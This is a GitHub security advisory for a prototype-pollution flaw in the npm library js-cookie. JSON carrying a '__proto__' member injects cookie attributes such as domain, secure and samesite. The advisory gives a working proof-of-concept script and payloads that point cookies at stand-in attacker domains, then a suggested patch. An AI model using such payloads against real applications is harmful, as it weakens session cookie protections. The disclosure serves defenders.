# [H] JavaScript Cookie: Per-instance prototype hijack in assign() enables cookie-attribute injection

## Summary
Severity: High
Advisory: GHSA-qjx8-664m-686j
CVE: CVE-2026-46625
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-05-21
Source: https://github.com/advisories/GHSA-qjx8-664m-686j
Type: github-advisory

## Affected
- npm: `js-cookie` — affected >=0 <3.0.7

## Details
## Summary

`js-cookie`'s internal `assign()` helper copies properties with `for...in` + plain assignment. When the source object is produced by `JSON.parse`, the JSON object's `"__proto__"` member is an *own enumerable* property, so the `for…in` enumerates it and the `target[key] = source[key]` write triggers the **`Object.prototype.__proto__` setter** on the fresh `target` (`{}`). The result is a per-instance prototype hijack: `Object.prototype` itself is untouched, but the merged `attributes` object now inherits attacker-controlled keys.

Because the consuming `set()` function then enumerates the merged object with another `for...in`, every key the attacker placed on the polluted prototype lands in the resulting `Set-Cookie` string as an attribute pair. The attacker can set `domain=`, `secure=`, `samesite=`, `expires=`, and `path=` on cookies whose attributes the developer thought were locked down.

## Impact

Any application that forwards a JSON-derived object as the `attributes` argument to `Cookies.set`, `Cookies.remove`, `Cookies.withAttributes`, or `Cookies.withConverter` is vulnerable. This is the standard pattern when cookie configuration comes from a backend:

```js
const cfg = await fetch('/config').then(r => r.json());
Cookies.set('session', token, cfg.cookieAttrs);   // cfg.cookieAttrs influenced by attacker
```

A payload of `{"__proto__":{"domain":"evil.example","secure":"false","samesite":"None"}}` causes js-cookie to emit:

```
Set-Cookie: session=TOKEN; path=/; domain=evil.example; secure=false; samesite=None
```

## Affected code

```js
// src/assign.mjs — full file
export default function (target) {
  for (var i = 1; i < arguments.length; i++) {
    var source = arguments[i]
    for (var key in source) {                 // includes own enumerable '__proto__'
      target[key] = source[key]                // [[Set]] form - fires __proto__ setter
    }
  }
  return target
}
```
## Proof of concept

Node 22.11.0, no third-party deps:

### Environment setup
```bash
mkdir -p /tmp/jscookie-poc && cd /tmp/jscookie-poc
npm init -y
npm i js-cookie
```

### PoC
```js
ubuntu@kuber:/tmp/jscookie-poc$ cat poc.mjs
let lastSetCookie = '';
globalThis.document = {
  get cookie() { return ''; },
  set cookie(v) { lastSetCookie = v; }
};

const { default: Cookies } = await import('js-cookie');

const attackerAttrs = JSON.parse(
  '{"__proto__":{"secure":"false","domain":"evil.com","samesite":"None","expires":-1}}'
);

Cookies.set('session', 'TOKEN', attackerAttrs);

console.log('Set-Cookie that js-cookie wrote to document.cookie:');
console.log(lastSetCookie);
```

Execution:
<img width="2614" height="1174" alt="cls-2026-05-14-01 44 39" src="https://github.com/user-attachments/assets/120df1fe-7e97-4ca3-904e-ab80d71ecf62" />

## Suggested patch

```diff
--- a/src/assign.mjs
+++ b/src/assign.mjs
@@
 export default function (target) {
   for (var i = 1; i < arguments.length; i++) {
     var source = arguments[i]
-    for (var key in source) {
-      target[key] = source[key]
-    }
+    for (var key in source) {
+      if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue
+      Object.defineProperty(target, key, {
+        value: source[key],
+        writable: true,
+        enumerable: true,
+        configurable: true,
+      })
+    }
   }
   return target
 }
```

Equivalent one-liner alternative - iterate own names only and filter:

```js
for (const key of Object.getOwnPropertyNames(source)) {
  if (key === '__proto__') continue
  target[key] = source[key]
}
```

## References
- https://github.com/js-cookie/js-cookie/security/advisories/GHSA-qjx8-664m-686j
- https://nvd.nist.gov/vuln/detail/CVE-2026-46625
- https://github.com/js-cookie/js-cookie/commit/eb3c40e89731e99b8970faaf35ddad249c6c0020
- https://github.com/js-cookie/js-cookie
- https://github.com/js-cookie/js-cookie/releases/tag/v3.0.7
